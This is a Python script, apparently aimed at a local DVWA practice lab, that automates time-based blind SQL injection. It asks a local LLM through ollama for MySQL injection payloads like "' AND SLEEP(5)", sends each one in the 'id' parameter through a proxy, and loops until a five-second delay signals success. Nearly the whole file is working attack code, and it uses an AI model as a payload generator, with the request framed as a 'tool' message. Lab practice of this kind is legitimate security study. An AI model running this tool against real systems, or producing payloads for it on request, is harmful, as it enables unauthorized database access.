from ollama import chat
import requests
import time


"""
Trying to get this to work with High setting.  No go yet.
"""


def generate_sql_injection_payload(url_endpoint):
    # Prepare the prompt asking for a SQL injection payload
    sleep_variant = "' AND SLEEP(5)"
    prompt = f"Can you provide me a different union sql injection like this {sleep_variant} payload for mysql in the 'id' parameter in the following URL: {url_endpoint}? Only return the payload, no other text or markdown please."

    # Model Setup/Config
    messages = [
        {
            'role': 'tool',
            'content': prompt
        }
    ]

    response = chat(
        model="llama3.3",  
        messages=messages
    )

    payload = response['message']['content'] 
    
    return payload

def requester(url_endpoint, data):

    cookies = {
        'security':'high',
        'PHPSESSID':'69a1a6912605768db6b75aae51feef3e'
    }
    proxies = {
        "http": "http://172.22.96.1:8081",
        "https": "http://172.22.96.1:8081",
    }
    headers = {
        "Content-Type":"application/x-www-form-urlencoded",
    }

    try:
        r = requests.post(url_endpoint, data=data, cookies=cookies, proxies=proxies, headers=headers)
        return r
    
    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")
        return False    

def main():
    url_endpoint = "http://localhost/vulnerabilities/sqli/session-input.php" 
    try:
        while True:
            sql_payload = generate_sql_injection_payload(url_endpoint)
            data = f"id=1{sql_payload}&Submit=Submit"

            start_time = time.perf_counter()
            r = requester(url_endpoint, data)
            end_time = time.perf_counter()
            elapsed_time = end_time - start_time
            formatted_time = f"{elapsed_time:.2f}"
            print(f"{formatted_time} {url_endpoint} {data}")
            
            if elapsed_time >= 5:
                break
        print(f"[+] SQL Injection Found! {url_endpoint}") 
            

    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")

if __name__ == "__main__":
    begin_runtime = time.time()
    main()
    end_runtime = time.time()
    runtime = end_runtime - begin_runtime
    print(f"Runtime: {runtime:.2f}") # two decimal places
